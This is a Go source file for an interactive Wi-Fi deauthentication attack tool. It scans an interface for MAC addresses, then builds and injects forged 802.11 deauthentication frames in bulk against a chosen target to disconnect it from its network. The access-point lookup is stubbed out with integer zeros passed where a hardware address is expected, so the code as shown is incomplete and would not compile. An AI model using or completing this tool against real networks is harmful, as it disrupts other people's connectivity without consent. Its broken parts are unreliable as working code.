package interfaces

import (
	"bufio"
	"deauth/color"
	"deauth/userIO"
	"errors"
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// Menu show the menu of the interfaces
func Menu() {
	for {
		choice := userIO.Prompt("(press h for help) " + color.ColorPrint("red", "=> "))
		switch choice {
		case "select":
			iface, err := AskInterface()
			if err != nil {
				fmt.Println("err :", err)
			} else {
				InterfaceMenu(iface)
			}
		case "h", "help":
			fmt.Println("select : select an interface")
			fmt.Println("exit   : exit")
		case "exit":
			return
		}
	}
}

// askInterface ask the user to select an interface
func AskInterface() (pcap.Interface, error) {
	ifacesList := GetInterfaces()
	ShowInterfaces(ifacesList)
	choice := ""
	for choice == "" {
		choice = userIO.Prompt(color.ColorPrint("cyan", "interface ") + "=> ")
		if choice == "" {
			fmt.Print("\033[F") // go back to previous line
		}
	}
	// from string to net.interface
	for _, iface := range ifacesList {
		if choice == iface.Name {
			return iface, nil
		}
	}
	return pcap.Interface{}, errors.New(choice + " : not a valid interface")
}

// InterfaceMenu show the menu of the interface
func InterfaceMenu(iface pcap.Interface) {
	var listMac []string
	for {
		choice := userIO.Prompt("(" + color.ColorPrint("cyan", iface.Name) + ") ")
		switch choice {
		case "h", "help":
			fmt.Println("scan   : scan the network")
			fmt.Println("show   : show AP")
			fmt.Println("deauth : deauth a mac address")
			fmt.Println("exit   : exit")
		case "scan":
			listMac = scanPkg(iface)
		case "show":
			bssid, ssid := 0, 0 //getAP(iface)
			fmt.Printf("%s : %s\n", ssid, bssid)
		case "deauth":
			mac := selectMac(listMac)
			npacket, err := strconv.Atoi(userIO.Prompt(color.ColorPrint("red", "number of packets ") + "=> "))
			if err != nil {
				fmt.Println("err :", err)
			} else {
				bssid, _ := 0, 0 // getAP(iface)
				prepareDeauth(iface, mac, bssid, npacket)
			}
		case "exit":
			return
		}
	}
}

// scanPkg scan the network and print the mac addresses
func scanPkg(iface pcap.Interface) []string {
	handle, err := pcap.OpenLive(iface.Name, 1600, true, pcap.BlockForever)
	if err != nil {
		fmt.Println("err :", err)
		return nil
	}
	defer handle.Close()
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	macAddrs := []string{}
	c := make(chan string)
	list := make(chan []string)
	go listMac(&macAddrs, c, list)
	go askStop(c)
	for packet := range packetSource.Packets() {
		ethernetLayer := packet.Layer(layers.LayerTypeEthernet)
		mac := ethernetLayer.(*layers.Ethernet).SrcMAC.String()
		macAddrs = append(macAddrs, mac)
		select {
		case <-c:
			return <-list
		default:
		}
	}
	return nil
}

// askStop ask the user to stop the mac address scan
func askStop(c chan string) {
	scan := bufio.NewScanner(os.Stdin)
	for {
		fmt.Println("(press q to stop)")
		scan.Scan()
		if scan.Text() == "q" {
			c <- "stop"
			c <- "stop"
			return
		}
	}
}

func listMac(macAddrs *[]string, c chan string, list chan []string) {
	alreadyIn := []string{}
	for {
		macAddrsWDuplicate := removeDuplicate(*macAddrs)
		if len(*macAddrs) > 0 {
			for _, mac := range macAddrsWDuplicate {
				if !contains(alreadyIn, mac) {
					fmt.Println(color.ColorPrint("red", "mac addresses :"), mac)
					alreadyIn = append(alreadyIn, mac)
				}
			}
		}
		select {
		case <-c:
			list <- alreadyIn
			return
		default:
		}
	}
}

func contains(s []string, e string) bool {
	for _, a := range s {
		if a == e {
			return true
		}
	}
	return false
}

func removeDuplicate(s []string) []string {
	keys := make(map[string]bool)
	list := []string{}
	for _, entry := range s {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}

// selectMac ask the user to select a mac address
func selectMac(listMac []string) net.HardwareAddr {
	for _, mac := range listMac {
		fmt.Println(color.ColorPrint("green", "=> "), mac)
	}
	choice := userIO.Prompt(color.ColorPrint("red", "mac address ") + "=> ")
	macAddr, err := net.ParseMAC(choice)
	if err != nil {
		fmt.Println("err :", err)
	}
	return macAddr
}

// prepareDeauth prepare the deauth attack
func prepareDeauth(iface pcap.Interface, mac net.HardwareAddr, ap net.HardwareAddr, npacket int) {
	handle, err := pcap.OpenLive(iface.Name, 1600, true, pcap.BlockForever)
	if err != nil {
		fmt.Println("err :", err)
		return
	}
	defer handle.Close()
	fmt.Println("sending deauth to", mac)
	for i := 0; i < npacket; i++ {
		sendDeauthPkg(ap, mac, handle)
	}
}

func sendDeauthPkg(ap net.HardwareAddr, mac net.HardwareAddr, handle *pcap.Handle) {
	for seq := uint16(0); seq < 64; seq++ {
		// create the packet
		deauth := gopacket.NewSerializeBuffer()
		err := gopacket.SerializeLayers(deauth, gopacket.SerializeOptions{
			ComputeChecksums: true,
		},
			&layers.RadioTap{},
			&layers.Dot11{
				Type:           layers.Dot11TypeMgmtDeauthentication,
				SequenceNumber: seq,
				Address1:       ap,  // receiver mac address
				Address2:       mac, // sender mac address

			},
			&layers.Dot11MgmtDeauthentication{
				Reason: layers.Dot11ReasonClass2FromNonAuth, // 7
			})
		if err != nil {
			fmt.Println("err :", err)
			return
		}
		injectPacket(handle, deauth.Bytes())
	}
}

// injectPacket inject a packet in the network
func injectPacket(handle *pcap.Handle, packet []byte) {
	err := handle.WritePacketData(packet)
	if err != nil {
		fmt.Println("err :", err)
	}
}

func ShowInterfaces(ifaces []pcap.Interface) {
	if runtime.GOOS == "windows" {
		for i := range ifaces {
			fmt.Println(color.ColorPrint("green", "\t=>"), ifaces[i].Name+" : "+ifaces[i].Description)
		}
	} else {
		for i := range ifaces {
			fmt.Println(color.ColorPrint("green", "\t=>"), ifaces[i].Name)
		}
	}
}

func GetInterfaces() []pcap.Interface {
	ifaces, err := pcap.FindAllDevs()
	if err != nil {
		fmt.Println("err :", err)
		return nil
	}
	return ifaces
}
